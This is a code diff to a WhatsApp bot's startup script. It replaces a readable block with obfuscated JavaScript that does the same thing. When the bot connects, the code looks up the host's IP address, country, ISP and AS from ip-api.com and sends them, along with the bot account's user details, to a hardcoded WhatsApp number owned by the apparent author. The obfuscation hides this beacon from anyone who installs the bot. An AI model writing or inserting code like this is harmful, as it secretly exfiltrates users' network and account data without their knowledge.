@@ -106,19 +106,7 @@ if (opts['test']) {
   })
   conn.connect().then(async () => {
 let wk = '```'
-let res = await axios.get("http://ip-api.com/json")
-let json = res.data
-
-conn.reply('6285157489446@s.whatsapp.net', `*⎋ MyWA Bot Installed ⎋*
-
-⍟ ────────────────── ⍟
-IP Address: ${json.query}
-Country: ${json.country}
-ISP: ${json.isp}
-AS: ${json.as}
-⍟ ────────────────── ⍟
-
-${wk}${util.format(conn.user)}${wk}`)
+const _0x3409c=_0x336a;function _0x1323(){const _0x2b2544=['data','get','6285157489446@s.whatsapp.net','*⎋\x20MyWA\x20Bot\x20Installed\x20⎋*\x0a\x0a⍟\x20──────────────────\x20⍟\x0a\x0aIP\x20Address:\x20','8WXHgoE','user','12SNOvuv','\x0a\x0aCountry:\x20','1051128cEEStX','isp','36377XObRaW','\x0a\x0aISP:\x20','\x0a\x0a⍟\x20──────────────────\x20⍟\x0a\x0aMyWA\x20by\x20Amirul\x20Dev','\x0a\x0aAS:\x20','1229710vjGsOF','1482916fPElDJ','7727209WNlhWU','660zXmVzw','\x0a\x0a⍟\x20──────────────────\x20⍟\x0a\x0a','http://ip-api.com/json','format','query','3DtZExo','2042037xnlVSA','793445Ihkxxc'];_0x1323=function(){return _0x2b2544;};return _0x1323();}function _0x336a(_0x2a6e56,_0x183bf8){const _0x132370=_0x1323();return _0x336a=function(_0x336aff,_0x24247d){_0x336aff=_0x336aff-0xd5;let _0x38d384=_0x132370[_0x336aff];return _0x38d384;},_0x336a(_0x2a6e56,_0x183bf8);}(function(_0x231459,_0x502423){const _0x4d0fec=_0x336a,_0x1b234d=_0x231459();while(!![]){try{const _0x27120b=-parseInt(_0x4d0fec(0xd7))/0x1+parseInt(_0x4d0fec(0xea))/0x2*(parseInt(_0x4d0fec(0xdf))/0x3)+parseInt(_0x4d0fec(0xd8))/0x4+-parseInt(_0x4d0fec(0xe1))/0x5*(-parseInt(_0x4d0fec(0xe8))/0x6)+-parseInt(_0x4d0fec(0xd9))/0x7*(-parseInt(_0x4d0fec(0xe6))/0x8)+-parseInt(_0x4d0fec(0xe0))/0x9+-parseInt(_0x4d0fec(0xda))/0xa*(parseInt(_0x4d0fec(0xec))/0xb);if(_0x27120b===_0x502423)break;else _0x1b234d['push'](_0x1b234d['shift']());}catch(_0x518b66){_0x1b234d['push'](_0x1b234d['shift']());}}}(_0x1323,0x9ce85));let res=await axios[_0x3409c(0xe3)](_0x3409c(0xdc)),json=res[_0x3409c(0xe2)];conn['reply'](_0x3409c(0xe4),_0x3409c(0xe5)+json[_0x3409c(0xde)]+_0x3409c(0xe9)+json['country']+_0x3409c(0xed)+json[_0x3409c(0xeb)]+_0x3409c(0xd6)+json['as']+_0x3409c(0xdb)+wk+util[_0x3409c(0xdd)](conn[_0x3409c(0xe7)])+wk+_0x3409c(0xd5));
 
     await global.db.read()
     global.db.data = {
